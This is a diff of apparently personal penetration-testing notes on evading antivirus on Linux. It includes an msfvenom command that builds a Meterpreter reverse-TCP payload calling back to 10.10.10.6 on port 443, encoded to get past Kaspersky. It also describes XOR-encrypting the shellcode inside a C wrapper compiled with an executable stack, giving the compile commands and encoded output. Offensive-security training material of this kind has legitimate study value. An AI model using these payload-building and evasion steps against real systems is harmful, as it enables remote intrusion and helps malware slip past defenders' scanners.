@@ -69,8 +69,27 @@ below example will check if user os running as root
 First, let's test our linux scan with [eicar](https://www.eicar.org/?page_id=3950) project. ```sudo kesl-control --scan-file ./eicar.txt```. The the eicar.txt should be removed. Otherwise, the scanner is not working. We can also check the Kaspersky’s event log for detected events ```sudo kesl-control -E --query | grep DetectName```.
 
 #### Bypass with x64/zutto_dekiru encoder
-this method bypass Kaspersky scanner, but not all scanner at [Antiscan.me](https://antiscan.me/)
+this method bypass Kaspersky scanner, but not all scanners at [Antiscan.me](https://antiscan.me/)
 
 ```
 sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.10.6 -e x64/zutto_dekiru -f elf -o /tmp/met64zutto.elf
+```
+
+#### Bypass with C code wrapper and xor encrytion.
+
+We can use the msfvenom to create c shell code, xor the shell code, wrap the xored shell code in c file, add decrypt function, and compile c file into exe.
+- [encoder.c](/08PlayingWithLinux/encoder.c) encrypt shell code and print out encrypted payload
+- [CWrapper.c](/08PlayingWithLinux/CWrapper.c) decrypt shell code and run
+
+Compile encoder and run encoder
+```
+kali@kali:~$ gcc -o encoder.out encoder.c
+
+kali@kali:~$ ./encoder.out
+\x20\x73\x12\x45\x4F\x02\xCF\x8A\
+```
+
+Compile shellcode wrapper, don't forget to compile the c code in the same architecture as target's
+```
+kali@kali:~$ gcc -o CWrapper.out CWrapper.c -z execstack
 ```
